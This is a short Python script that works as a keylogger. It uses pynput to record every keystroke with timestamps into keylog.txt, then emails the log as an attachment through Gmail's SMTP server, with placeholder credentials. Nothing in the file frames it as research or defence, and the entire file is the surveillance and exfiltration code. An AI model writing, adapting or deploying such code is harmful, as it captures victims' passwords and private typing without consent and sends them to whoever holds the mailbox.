import smtplib
from email.message import EmailMessage
import pynput
import logging
import time

Address = 'Enter email address'
Password = 'password'

def logger():
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

    def on_press(key):
        logging.info(str(key))

    with pynput.keyboard.Listener(on_press=on_press) as ls:
        ls.join()

def send():
    msg = EmailMessage()
    msg["From"] = Address
    msg["Subject"] = "subject here"
    msg["To"] = Address
    msg.set_content("message here")
    msg.add_attachment(open('keylog.txt', "r").read(), filename="log.txt")

    with smtplib.SMTP_SSL(host='smtp.gmail.com', port=465) as go:

        go.login(Address, Password)

        go.send_message(msg)

logger()
time.sleep(5)
send()